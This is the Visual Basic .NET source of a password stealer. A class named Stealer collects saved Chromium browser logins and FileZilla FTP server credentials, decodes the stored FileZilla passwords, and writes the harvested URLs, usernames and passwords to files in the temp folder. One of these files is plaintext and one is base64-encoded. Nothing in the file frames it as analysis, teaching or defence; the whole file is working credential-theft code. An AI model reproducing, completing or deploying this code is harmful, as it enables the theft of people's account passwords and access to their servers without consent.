Imports System.IO
Imports System.Text
Imports System.Security.Cryptography
Imports System.Windows.Forms
Imports PasswordStealer.ChromeRecovery

Public Class Stealer
    Dim Data As String
    Public a As String
    Public Paths As String = IO.Path.GetTempPath & "\"
    Public Function Run()
        Try
            Dim TextBox1 As New TextBox

            TextBox1.Multiline = True

            FileZillaStealer()

            Dim a = Chromium.Grab()

            For Each b In a
                TextBox1.AppendText(b.URL & "," & b.UserName & "," & b.Password & vbNewLine)
            Next

            IO.File.WriteAllText(Paths & "ChromePassword.txt", TextBox1.Text)

            If Not (Data = "") Then
                TextBox1.AppendText(Data)
            End If

            If TextBox1.Text = "" Then
                Return False
            Else
                IO.File.WriteAllText(Paths & "Passwords.txt", ENB(TextBox1.Text))
            End If
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Public Sub FileZillaStealer()
        If File.Exists(Environ("APPDATA") & "\FileZilla\recentservers.xml") Then
            Try

                Dim datafile As String() = Split(IO.File.ReadAllText(Environ("APPDATA") & "\FileZilla\recentservers.xml"), "<Server>")
                For Each user As String In datafile
                    Dim spliter = Split(user, vbNewLine)
                    For Each I As String In spliter
                        If I.Contains("<Host>") Then
                            Data += Split(Split(I, "<Host>")(1), "</Host>")(0) & ","
                        End If
                        If I.Contains("<User>") Then
                            Data += Split(Split(I, "<User>")(1), "</User>")(0) & ","
                        End If
                        If I.Contains("<Pass " & My.Resources.String1 & ">") Then
                            Data += DEB(Split(Split(I, "<Pass " & My.Resources.String1 & ">")(1), "</Pass>")(0))
                        End If
                        If I.Contains("<Pass>") Then
                            Data += Split(Split(I, "<Pass>")(1), "</Pass>")(0)
                        End If
                    Next
                Next
            Catch ex As Exception
                Data += ""
            End Try
        End If
    End Sub
    Public Function DEB(ByRef s As String) As String
        Dim b As Byte() = Convert.FromBase64String(s)
        DEB = System.Text.Encoding.UTF8.GetString(b)
    End Function
    Public Function ENB(ByRef s As String) As String
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        ENB = Convert.ToBase64String(byt)
    End Function
End Class